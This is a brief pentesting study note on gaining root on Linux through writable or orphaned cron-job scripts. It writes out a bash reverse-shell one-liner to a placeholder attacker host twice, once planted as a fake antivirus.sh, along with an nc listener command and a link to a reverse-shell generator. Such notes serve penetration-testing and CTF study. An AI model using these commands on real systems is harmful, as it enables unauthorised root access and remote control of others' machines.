# Privilege Escalition - Cron Jobs

### **🕒 Privilege Escalation via Cron Jobs**

---

### **🧠 Concept Overview**

- **Cron jobs** are scheduled tasks/scripts that run at specified times.
- They run with the **privileges of the user who owns the cron job**, not the user invoking it.
- If a **cron job is owned by root** and references a script that **we can modify**, we can escalate to root by altering the script.

---

### **🔍 Where to Look**

- **System-wide cron jobs**: /etc/crontab
- **User-specific cron jobs**: crontab -l (view), crontab -e (edit, if permitted)

---

### **🪝 Exploitation Scenarios**

### **1. ✅ Writable Scheduled Script**

- Example:
    - Cron job executes /home/user/backup.sh every minute.
    - If we can edit backup.sh, we can inject a **reverse shell** payload.
- **Payload (bash example)**:

```
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

- **Attacker**: Set up a listener:

```
nc -lvnp PORT
```

### **2. 🗑️ Missing Script, Active Cron Entry**

- Scenario:
    - Cron job references a script that has been **deleted** (e.g., antivirus.sh).
    - **No full path provided**, and PATH includes writable dirs (like /home/user).
    - You can **create a script** with the same name (antivirus.sh) in a directory from $PATH.
- **Example Steps**:

```
echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" > ~/antivirus.sh
chmod +x ~/antivirus.sh
```

- Set up your listener again and wait for the cron job to execute.

---

### **🛠️ Tools & Tips**

- **Reverse Shell Generators**:
    - https://www.revshells.com/
- **Check cron job frequencies**:
    - CTF = often every minute
    - Real world = daily, weekly, monthly
- **Always verify reverse shell support on target**:
    - nc often lacks -e; try bash, Python, Perl, or Socat instead.

---

### **⚠️ Real-World Notes**

- **Cron + wildcard exploitation**:
    - If cron job runs tools like tar, 7z, rsync, etc., check for **wildcard injection** potential.
- **Change Management Issue**:
    - Orphaned cron entries for removed scripts are common in low-maturity orgs.
- **Avoid system instability**:
    - Use **reverse shells** instead of destructive shell replacements in real engagements.